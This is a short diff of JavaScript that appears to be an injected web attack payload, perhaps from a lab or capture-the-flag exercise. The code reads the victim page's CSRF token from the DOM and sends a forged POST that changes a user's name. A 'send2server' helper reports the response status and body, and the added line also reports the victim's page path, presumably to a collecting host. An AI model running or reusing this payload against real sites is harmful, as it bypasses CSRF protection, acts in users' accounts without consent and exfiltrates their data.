@@ -14,4 +14,7 @@ xhr.onload = function() {
     send2server("status", " "+xhr.status);
     send2server("response", xhr.response);
 };
+
+send2server("url", window.location.pathname);
+
 xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
